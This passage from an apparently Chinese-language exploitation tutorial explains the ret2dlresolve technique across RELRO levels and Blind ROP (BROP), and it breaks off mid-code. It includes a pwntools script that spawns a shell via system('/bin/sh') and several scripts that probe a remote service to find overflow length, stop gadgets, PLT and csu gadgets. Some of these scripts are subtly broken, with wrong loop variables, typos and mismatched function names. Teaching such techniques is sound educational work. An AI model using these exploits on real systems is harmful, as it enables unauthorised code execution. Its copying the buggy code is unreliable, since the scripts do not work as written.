__libc_csu_init+57↓j</span><br><span class="line">; Second gadgets.</span><br><span class="line">.text:080487D8                 mov     eax, [esp+2Ch+arg_8]</span><br><span class="line">.text:080487DC                 mov     [esp+2Ch+var_2C], ebp</span><br><span class="line">.text:080487DF                 mov     [esp+2Ch+var_24], eax</span><br><span class="line">.text:080487E3                 mov     eax, [esp+2Ch+arg_4]</span><br><span class="line">.text:080487E7                 mov     [esp+2Ch+var_28], eax</span><br><span class="line">.text:080487EB                 call    ds:(__frame_dummy_init_array_entry - 804A000h)[ebx+edi*4]</span><br><span class="line">.text:080487F2                 add     edi, 1</span><br><span class="line">.text:080487F5                 cmp     edi, esi</span><br><span class="line">.text:080487F7                 jnz     short loc_80487D8</span><br><span class="line">.text:080487F9</span><br><span class="line">.text:080487F9 loc_80487F9:                            ; CODE XREF: __libc_csu_init+30↑j</span><br><span class="line">.text:080487F9                 add     esp, 1Ch</span><br><span class="line">; First gadgets.</span><br><span class="line">.text:080487FC                 pop     ebx</span><br><span class="line">.text:080487FD                 pop     esi</span><br><span class="line">.text:080487FE                 pop     edi</span><br><span class="line">.text:080487FF                 pop     ebp</span><br><span class="line">.text:08048800                 retn</span><br></pre></td></tr></table></figure><h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><p>在 libc 节中 libc 中提到过 plt 表的第一项就是跳转到_dl_runtime_resolve 函数，该函数的作用就是动态将 libc 中的函数地址写入 got 表中，并且执行被解析到函数。_dl_runtime_resolve 函数原型为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，假如可以控制这两个参数，就可以控制_dl_runtime_resolve 解析并执行我们想要的函数。</p><p>plt 表与 got 表的部分结构如下所示。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">    push got[1]</span><br><span class="line">    jmp got[2]</span><br><span class="line">func@plt:</span><br><span class="line">    jmp func@got</span><br><span class="line">    push func_index</span><br><span class="line">    jmp plt[0]</span><br><span class="line"></span><br><span class="line">got[0] ---&gt; .dynamic address</span><br><span class="line">got[1] ---&gt; link_map_object address</span><br><span class="line">got[2] ---&gt; _dl_runtime_resolve address</span><br></pre></td></tr></table></figure><p>通过上表可以看到_dl_runtime_resolve 函数的两个参数 link_map_obj 与对应的函数 reloc_index 分别在 func@plt 与 plt[0]中被 push 到栈中，而 jmp 到 got[2]以后直接调用_dl_runtime_resolve 函数，执行顺序的行数为 5，6，7，2，3，11。</p><p>在_dl_runtime_resolve 调用的时候，会做如下几件事，而这几件事对后续的 ret2dlresolve 利用非常重要。</p><ol><li>首先通过 link_map_object 访问.dynamic 段（link_map_object 保存了.dynamic 地址），分别取出.dynstr，.dynsym 和.rel.plt 的地址，其中.dynstr 为动态链接字符串表，包含了动态链接时所需要的所有字符串（包括函数名），.dynsym 是动态链接符号表，类似符号表，里面保存了和动态链接相关的所有符号，.rel.plt 是动态链接代码重定位段，包含了需要重定位的函数信息，包括函数偏移，在符号表中的索引等。</li><li>在取出这三个地址以后，先通过.rel.plt 地址 +reloc_index 就可以计算出要被动态链接的函数的重定位表指针 rel</li><li>然后通过 <code>rel-&gt;r_info&gt;&gt;8</code> 就可以计算出在.dynsym 动态链接符号表中的下标</li><li>根据.dynsym 的地址 + 下标偏移就可以拿到对应符号表项的指针 sym</li><li>之后通过.dynstr 地址 +<code>sym-&gt;st_name</code>就可以取出符号名字符串的指针，也就是函数名指针</li><li>然后在动态链接库中查找这个函数的地址，并把地址写入<code>*(rel-&gt;r_offset)</code>，也就是该函数对应的 got 表项</li><li>最后调用这个函数</li></ol><p>其中.dynamic 段的结构是一个数组，数组每一项的结构如下所示，其实根据 d_tag 的值就可以很容易在.dynamic 中找到对应项地址，.dynstr，.dynsym 和.rel.plt 对应的 tag 值为 5，6，17。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL   0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED 1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT 3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH   4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB 5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB 6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA   7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ 8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ  10    <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT 11    <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT   12    <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI   13    <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME 14    <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH  15    <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC 16    <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL    17    <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ  18    <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT 19    <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL 20    <span class="comment">/* Type of reloc in PLT */</span></span></span><br></pre></td></tr></table></figure><p>.dynsym 是一个数组，数组的每一项 sym 的结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>.rel.plt 也是一个数组，数组的每一项 rel 的结构如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p>攻击方法：</p><ol><li><p>程序没有开启 RELRO</p><p> 那么我们可以任意修改.dynamic 段（数组）里的内容。首先在一块可控的内存区域内伪造一个字符串表，将 func 字符串（func 可以为 libc 中的任意目标函数，例如 read，puts 等）替换为 system 字符串，之后修改.dynamic 里的字符串表地址（.dynstr，该地址很容易通过 tag 查到）为我们伪造的字符串表地址，最后通过栈溢出修改 ret 为 func@plt 的第二条指令的地址，也就是<code>push func_index</code>，这样就会为 func 调用一次_dl_runtime_resolve，这样根据符号名解析到的就是 system 函数，最后会执行 system 函数。</p></li><li><p>开启了 Partial RELRO</p><p> 这时就不可以修改.dynamic 中的值了，但是可以通过伪造.rel.plt 表实现。虽然从.dynamic 中取出的.rel.plt 地址我们不可以控制，但是 reloc_index 是在栈中，因此可以被我们控制，所以通过.rel.plt 地址 +reloc_index 我们就可以控制重定位表指针 rel 的值，精心构造的 reloc_index 可以让 rel 指向我们伪造的一个重定位表项，这时 <code>rel-&gt;r_info</code> 我们也可以控制，就可以控制.dynsym 动态链接符号表中的下标。同样类似控制 rel，虽然从.dynamic 中取出的.dynsym 地址不可以控制，但是下标是可以控制的，因此我们也可以控制.dynsym 的地址 + 下标偏移得到对应符号表项的指针 sym，可以使 sym 指向我们伪造的一个 sym 表项，在伪造的 sym 表项中我们可以控制 <code>sym-&gt;st_name</code>，这样我们就可以控制.dynstr 地址 +<code>sym-&gt;st_name</code> 所指向的的符号名为我们控制的字符串，例如 system，同样调用_dl_runtime_resolve 的时候可以执行 system，最后需要注意的是 <code>rel-&gt;r_offset</code> 指向的地址需要可写。综上所述，具体利用步骤如下。</p><ol><li><p>计算 reloc_index。通过 <code>objdump -s -j .rel.plt ./pwn</code> 获取.rel.plt 在程序中的偏移 offset，因此<code>reloc_index = fake_rel_plt_addr - offset</code></p></li><li><p>找一个可控内存伪造 rel 表项，其中 r_offset 需要可写</p></li><li><p>计算 rel 表项中的 r_info。通过 <code>objdump -s -j .dynsym ./pwn</code> 获取.dynsym 在程序中的偏移 offset，因此<code>r_info = ((fake_dynsym_addr - offset) / 0x10)&lt;&lt;8 + 0x7</code></p></li><li><p>找一个可控内存伪造 sym 表项。表项中其他值都不重要，重要的是 st_name 的值。</p></li><li><p>计算 sym 中的 st_name。通过 <code>objdump -s -j .dynstr ./pwn</code> 获取.dynstr 在程序中的偏移 offset，因此<code>st_name = fake_dynstr_addr - offset</code></p></li><li><p>找一个可控内存 fake_dynstr_addr 写入想要解析的符号字符串，例如 system</p></li><li><p>至此 rel 表项，sym 表项和符号都伪造完成，也计算出了 reloc_index，所以直接将 reloc_index 放在栈顶，然后跳转到 plt 表项中直接 <code>jmp plt[0]</code> 的地址即可。</p></li><li><p>若栈上的值实在不好控制，则可以通过栈迁移将栈转移到 bss 段在进行操作，需要注意内存对齐的情况。</p></li><li><p>由于上述手工步骤过于复杂，而且有很多重复操作的步骤，也容易出错，因此 pwntools 中集成了关于 ret2dlreslove 的利用方法，下面的示例来自 ctf-wiki。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line"></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + rop.chain() + <span class="string">&#x27;a&#x27;</span> * <span class="number">256</span> + dlresolve.payload</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ol></li><li><p>开启了 Full RELRO</p><p> 这种情况下程序中使用的动态链接的函数在程序开始执行之前就被解析完毕，_dl_runtime_reslove 和 got 表也就用不到了，而且.dynamic 和 got 表都不可写，无法利用。</p></li></ol><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p>BROP 就是 Blind ROP，也就是 ROP 盲打，指在没有程序可执行文件的情况下利用 ROP 进行盲打。</p><p>攻击前提：</p><ol><li>必须存在栈溢出可以覆盖 ret 地址劫持控制流</li><li>程序崩溃后可以自动重启，并且重启后地址不变（例如 nginx，mysql，apache，openssh 等服务器）</li></ol><p>攻击步骤：</p><ol><li><p>获取栈溢出长度</p><p> 非常简单，通过枚举即可，每次增加一个字节直到程序报错</p></li><li><p>绕过 canary</p><p> 通过逐字节爆破 canary，主要用了 0x82 节中的爆破方法获取到 canary</p></li><li><p>rop</p><p> 找到 canary 以后我们就可以控制 ret 了，这时候就需要找到合适的 garget 来形成 rop 链。</p></li></ol><p>由于我们不知道程序里的代码，所以想直接找到一个 syscall 几乎是不可能的，因此首要任务就是先想办法可以打印出程序的内存，使我们可以获取更多的信息，这是我们的目标。即然需要打印程序，那么就需要函数调用 / 系统调用，首先就需要找到可以控制寄存器的 gadgets。通过 0x85 节我们可以知道在 csu 中有一段通用的 gadgets，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p>但是我们想控制的是 rdi，rsi 和 rdx 这三个寄存器（这三个寄存器中保存函数参数），但是从 csu 的 gadget 中，如果从 0x400621（0x40061A+7）处开始，这一段 gadget 就变成了<code>pop rsi; pop r15; ret</code>，如果从 0x400623（0x40061A+9）处开始，这一段 gadget 就变成了<code>pop rdi; ret</code>，这样我们就有了两个已知的可以控制 rdi 和 rsi 的 gadgets，但是 gadgets 的具体位置，我们还是一无所知，只能通过猜测 + 测试的方法获取 gadgets。</p><p>首先我们将程序的 gadgets 分为 3 类：stop gadgets，trap gadgets 和 probe gadgets。Probe gadgets 就是我们猜测并且需要测试的 gadgets，对于 64 位程序，可以直接从 0x400000 开始尝试，如果不成功则程序可能开启了 PIE，或者这是 32 位的程序。Stop gadgets 是一段不会使程序立即崩溃的 gadgets，也就是说程序控制流跳转到 stop gadgets 以后还可以正常运行一段时间，之后可能会发生崩溃。Trap gadgets 则是一段可以立即使程序崩溃的 gadgets，其实 trap gadgets 可以不是一段 gadgets，甚至可以是一个非法地址，只要程序跳转到 trap 以后可以立即崩溃就行。最后，通过 stop 和 trap 在栈上的不同布局，我们就可以测试我们猜测的 prob 是否是一段正确的 gadgets（其实原理上类似 SQL 注入的时间盲注），有如下几个例子。</p><ol><li><p>测试不会对栈进行操作的 gadgets，例如 <code>ret</code>，<code>xor eax, eax; ret</code> 等，若没有进行 pop 或 push，则会直接跳转到 stop，程序不会立即崩溃，否则就会跳转到 trap，程序会立即崩溃，后续几个例子的原理相同。</p><p> buf | canary | probe | stop | trap | trap | … |</p></li><li><p>测试只 pop 一次的 gadgets。</p><p> buf | canary | probe | trap | stop | trap | trap | … |</p></li><li><p>测试 pop 了两次的 gadgets，可以依此类推寻找 pop 多次的 gadgets</p><p> buf | canary | probe | trap | trap | stop | trap | trap | .. |</p></li><li><p>测试 probe 是不是一个 stop gadgets，若 probe 是一个 stop gadgets，则程序不会立即崩溃，否则就会立即崩溃</p><p> buf | canary | probe | trap | trap | … |</p></li><li><p>找到到 csu 中那连续 6 个 pop 的 gadgets（非常重要，找到这个 gadgets 就相当于可以控制很多寄存器）</p><p> buf | canary | probe | trap | trap | trap | trap | trap | trap | stop | trap | trap | … |</p></li></ol><p>关于识别 plt 表，plt 相对比较稳定，跳转到 plt 以后程序一般不会崩溃。plt 表的每一项都是 16 字节长，所以若连续 16 次测试 probe 的时候程序都没有崩溃（例如从 0x400000 开始尝试，尝试到 0x400010，这些 probe 都是 gadgets），那么很可能遇到了 plt 表。此外，plt 中的一项包含了 3 条指令<code>jmp func@got; push func_index; jmp plt[0]</code>，第一条指令 jmp 长 6 字节，第二条指令 push 长 5 字节，最后一个 jmp 指令长 5 字节，因此可以通过前后偏移 6 字节来确定哪一个 probe 是 plt 表项的中间（即是处于 push 还是处于第一个 jmp）。</p><p>此时虽然我们找到了 plt 表，但是还不能确定哪一个是输出函数（例如 puts），我们最终的目标是调用输出函数打印程序内存。例如寻找 puts 函数，我们只需要控制 rdi 即可（puts 只接受一个参数），那么我们可以依次遍历每一个 plt 表项，每次遍历的 step 为 16 字节，之后我们控制 rdi 为程序的开头也就是 0x400000（未开启 PIE），ELF 开头的 4 个字节一般为<code>\x7fELF</code>，所以如果某一个 plt 表项调用完以后发现程序输出了这 4 个字节，那么那就是 puts 的 plt 表项，找到了 puts 的地址以后我们就可以随心所欲输出程序地址的内存了，甚至可以把代码段全打印出来供我们离线寻找更多的 gadgets。</p><p>综上所述，brop 的一般过程如下所述。首先确定溢出长度，exp 如下，注意，若遇到了 canary 则该函数返回的仅为 buf 长度，若没有 canary（比较少见），则该函数返回的包括了 old ebp 的长度。其中 <code>get_remote_conn</code> 函数可以获取一个 remote conn，<code>conn_send_recv</code>函数负责发送和接收 data。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_overflow_length</span>():</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            output = conn_send_recv(conn, <span class="string">&#x27;a&#x27;</span> * length)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="comment"># OK means remote not crash.</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Crash and output something else.</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> length - <span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后需要寻找 stop gadgets，exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_gadget</span>(<span class="params">buf_length, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            conn_send_recv(conn. payload + p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>找到 stop gadgets 以后就成功了一半了，剩下的就是寻找 plt 的地址以及遍历 plt 找到 puts 的地址。首先是寻找 plt 的 exp，注意程序可能不止一处连续 16 次都不崩溃，所以最好根据不同的 start_addr 多尝试几次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_plt</span>(<span class="params">start_addr, buf_length, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = start_addr  <span class="comment"># Which address you want to start.</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64(stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">16</span>:</span><br><span class="line">                <span class="keyword">return</span> addr - <span class="number">16</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            count = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>寻找 csu 中的 gadgets 地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_csu</span>(<span class="params">buf_legnth, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">6</span>  <span class="comment"># 6 traps</span></span><br><span class="line">    payload += p64(stop_gadgets)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 traps</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote()</span><br><span class="line">            output = conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>找到 csu 的 gadgets 地址以后，通过偏移 9 就可以得到 <code>pop rdi; ret</code> 的 gadgets，这样我们就可以控制 puts 的参数，然后是寻找 puts 的 plt 地址（其实也可以把 step 从 16 调整为 1）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 